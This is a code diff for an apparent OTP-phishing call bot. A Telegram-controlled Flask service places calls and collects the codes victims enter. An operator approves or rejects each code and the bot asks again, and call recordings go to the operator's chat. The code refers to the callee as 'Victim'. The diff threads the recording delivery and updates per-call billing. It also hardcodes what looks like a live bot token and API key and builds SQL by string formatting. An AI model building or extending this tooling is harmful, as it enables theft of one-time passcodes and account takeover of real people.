@@ -36,6 +36,8 @@ bot_tkn ='7229632476:AAFZHpaFIZzOJrskzphIfMoTsDyjSlZWwoc'  # YOUR BOT API bot_tk
 apiKey = '741852963741852963789456123'
 last_message_ids = {}
 ringing_handler = []
+recording_handler = {}
+
 updater = Updater(token=bot_tkn, use_context=True)
 dispatcher = updater.dispatcher
 
@@ -781,6 +783,19 @@ def Set_custogrem_script(message):
 
 #------------------------------------------------------------------------------------------------------------------
 
+def retrive_recording(rec_url,chatid):
+                response = requests.get(rec_url)
+                payload = {
+                    'chat_id': {chatid},
+                    'title': 'articuno-voice.mp3',
+                    'parse_mode': 'HTML'
+                }
+                files = {
+                    'audio': response.content,
+                }
+                requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
+
+
 
 def callhangup(call_control:str):
     hangurl = f'https://articunoapi.com:8443/hangup'
@@ -789,7 +804,6 @@ def callhangup(call_control:str):
     }
     requests.post(hangurl,json=payload)
 
-   
 
 def callhangbutton(userid):
     keyboard = types.InlineKeyboardMarkup(row_width=2)
@@ -912,7 +926,7 @@ def custom_confirm1(message):
         callhangup(call_control_id)
 
     elif up_resp1=='Deny':
-        mes1=bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown').message_id
+        bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown')
         url = 'https://articunoapi.com:8443/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
@@ -921,18 +935,13 @@ def custom_confirm1(message):
 
 }
         requests.post(url, json=data)
-        requests.post(f"https://api.telegram.org/bot{bot_tkn}/editMessageText", 
-              data={
-            "chat_id": chat_id,
-            "message_id": mes1,
-            "text": '*Asking For Otp Again 🗣️*',
-            'parse_mode':'markdown'})
     c.close()
     return 'Webhook received successfully!', 200
         
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
     global ringing_handler
+    global recording_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -947,11 +956,9 @@ def custom_prebuild_script_call(script_id,chatid):
     voices = c.fetchone()
     call_cost = voices[11]
     
-    if event == "call.ringing":
-        
-        if call_control_id not in ringing_handler:  
+    if event == "call.ringing":  
             callhangbutton(chatid)
-            ringing_handler.append(call_control_id)
+            
         
     elif event == "call.answered":
             url1 = "https://articunoapi.com:8443/gather-audio"
@@ -962,36 +969,20 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url1, json=data)
             bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
-            try:
-                ringing_handler.remove(call_control_id)
-            except:
-                 pass
+
         
 
     elif event == "call.hangup":
-        try:
-            time.sleep(0.7)
-            resp = data['recording_url']
-            response = requests.get(resp)
-            payload = {
-                'chat_id': {chatid},
-                'title': 'articuno-voice.mp3',
-                'parse_mode': 'HTML'
-            }
-            files = {
-                'audio': response.content,
-            }
-            requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
+            try:
+                recording_handler[call_control_id] = data['recording_url']
+                per_call_cost = data['charge']
+                call_cost_update = call_cost + per_call_cost
+                c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
+                db.commit()
+            except:
+                 print("Recording Error")
             
-            per_call_cost = data['charge']
-            call_cost_update = call_cost + per_call_cost
-            print(call_cost_update,per_call_cost)
-            c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
-            db.commit()
-            bot.send_message(chatid,f"""*Victim ended the call*""",reply_markup=keyboard, parse_mode='Markdown')
             
-        except:
-            print("No Audio File")
 
 
     # elif event == "amd.machine":
@@ -1011,7 +1002,12 @@ def custom_prebuild_script_call(script_id,chatid):
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
-
+            try:
+                 recurl =  recording_handler[call_control_id]
+                 send_record = threading.Thread(target=retrive_recording, args=(recurl,chatid,))
+                 send_record.start()
+            except:
+                 print("error in sending Recording")
 
     elif event == "dtmf.entered":
         data = request.get_json()
